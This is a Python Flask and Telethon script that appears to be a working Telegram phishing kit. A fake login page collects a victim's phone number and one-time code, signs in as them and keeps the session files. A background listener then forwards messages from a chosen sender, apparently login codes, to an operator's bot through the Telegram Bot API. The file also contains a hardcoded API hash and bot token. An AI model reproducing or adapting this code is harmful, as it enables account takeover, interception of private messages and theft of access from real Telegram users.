import os
import asyncio
from multiprocessing import Process
from flask import Flask, render_template, request, redirect, url_for, flash, session
from telethon.sync import TelegramClient
from telethon.errors import PhoneCodeExpiredError, PhoneNumberInvalidError, SessionPasswordNeededError
from telethon import events
import shutil  # Untuk memindahkan file sesi
import requests

# Flask app initialization
app = Flask(__name__)
app.secret_key = 'your_secret_key'

# Telegram API configuration
api_id = 9881303  # Replace with your API ID
api_hash = '282b0608478012810d0f6c2ded14ccd0'  # Replace with your API Hash
session_dir = 'sessions'  # Directory to store successful session files
temp_session_dir = 'temp_sessions'  # Directory to store temporary session files
bot_token = '7544504502:AAG1MAoj3LqMuj4NLFOKTRoK3KC7GQYsZ3o'  # Bot Token
bot_chat_id = '7040243191'  # Chat ID of your bot

# Ensure session directories exist
os.makedirs(session_dir, exist_ok=True)
os.makedirs(temp_session_dir, exist_ok=True)

active_clients = {}

# Helper function to send messages to bot
def send_message_to_bot(message):
    """Send a message to Telegram bot."""
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    payload = {'chat_id': bot_chat_id, 'text': message}
    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()
    except Exception as e:
        print(f"Error sending message to bot: {e}")

# Async function to start Telegram listener
async def start_listening(client, phone_number):
    @client.on(events.NewMessage)
    async def new_message_handler(event):
        message_text = event.message.text
        sender = event.sender_id
        if sender == 6482895062:  # Replace with the expected sender ID
            me = await event.client.get_me()
            phone_number = me.phone if me.phone else "Number not found"
            print(f"New message from {phone_number}: {message_text}")
            send_message_to_bot(f"New message from {phone_number}: {message_text}")

    print(f"Listener active for {phone_number}.")
    await client.run_until_disconnected()

# Async function to manage Telegram sessions
async def check_and_manage_sessions():
    """Manage and monitor Telegram sessions."""
    global active_clients
    while True:
        session_files = [f for f in os.listdir(session_dir) if f.endswith(".session")]

        for session_file in session_files:
            phone_number = session_file.replace('.session', '')
            session_path = os.path.join(session_dir, session_file)

            if phone_number in active_clients:
                continue  # Skip if already active

            client = TelegramClient(session_path, api_id, api_hash)
            try:
                await client.connect()
                if await client.is_user_authorized():
                    print(f"Session {phone_number} authenticated. Starting listener.")
                    active_clients[phone_number] = client
                    asyncio.create_task(start_listening(client, phone_number))
                else:
                    print(f"Session {phone_number} not authenticated. Deleting session.")
                    await client.disconnect()
                    os.remove(session_path)
            except Exception as e:
                print(f"Error with session {phone_number}: {e}")
                if client.is_connected():
                    await client.disconnect()

        # Remove inactive clients
        for phone_number, client in list(active_clients.items()):
            if not client.is_connected():
                print(f"Removing inactive client: {phone_number}")
                del active_clients[phone_number]

        await asyncio.sleep(10)

# Telegram login function
async def telegram_login(phone_number):
    temp_session_path = os.path.join(temp_session_dir, phone_number)
    client = TelegramClient(temp_session_path, api_id, api_hash)

    try:
        await client.connect()
        if await client.is_user_authorized():
            # Move session to main directory
            shutil.move(f"{temp_session_path}.session", session_dir)
            return "Login success", None
        else:
            result = await client.send_code_request(phone_number)
            return "OTP sent", result.phone_code_hash
    except PhoneNumberInvalidError:
        return "Error: Invalid phone number", None
    except Exception as e:
        return f"Error: {str(e)}", None
    finally:
        if client.is_connected():
            await client.disconnect()

        # Tunggu sebentar sebelum mencoba menghapus file
        await asyncio.sleep(0.1)

        # Hapus file sesi sementara jika ada
        temp_session_file = f"{temp_session_path}.session"
        if os.path.exists(temp_session_file):
            try:
                os.remove(temp_session_file)
            except PermissionError as pe:
                print(f"Error deleting session file {temp_session_file}: {pe}")


# Flask routes
@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    phone_number = request.form['phone_number']
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result, phone_code_hash = loop.run_until_complete(telegram_login(phone_number))

    if result == "OTP sent":
        flash('OTP sent. Enter the code.', 'info')
        session['phone_code_hash'] = phone_code_hash
        return redirect(url_for('verify', phone_number=phone_number))
    elif result == "Login success":
        flash('Login successful.', 'success')
        return redirect(url_for('dashboard'))
    else:
        flash(f'Error: {result}', 'danger')
        return redirect(url_for('index'))

@app.route('/verify/<phone_number>', methods=['GET', 'POST'])
def verify(phone_number):
    if request.method == 'POST':
        otp_code = request.form['otp_code']
        phone_code_hash = session.get('phone_code_hash')
        temp_session_path = os.path.join(temp_session_dir, phone_number)

        async def verify_otp():
            client = TelegramClient(temp_session_path, api_id, api_hash)
            try:
                await client.connect()
                await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)
                flash('Verification successful. Login complete.', 'success')
            except Exception as e:
                flash(f'Error: {e}', 'danger')
            finally:
                if client.is_connected():
                    await client.disconnect()
                
                # Tunggu sebentar untuk memastikan file tidak terkunci
                await asyncio.sleep(0.1)

                temp_session_file = f"{temp_session_path}.session"
                if os.path.exists(temp_session_file):
                    try:
                        shutil.move(temp_session_file, os.path.join(session_dir, os.path.basename(temp_session_file)))
                    except PermissionError as pe:
                        flash(f"Error during session move: {pe}", "danger")
                        print(f"Error during session move: {pe}")

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(verify_otp())
        return redirect(url_for('dashboard'))

    return render_template('verify.html', phone_number=phone_number)


@app.route('/dashboard')
def dashboard():
    return 'Welcome to the dashboard!'

# Listener process
def run_listener():
    asyncio.run(check_and_manage_sessions())

# Main entry point
if __name__ == '__main__':
    listener_process = Process(target=run_listener)
    listener_process.start()

    app.run(debug=True)

    listener_process.join()
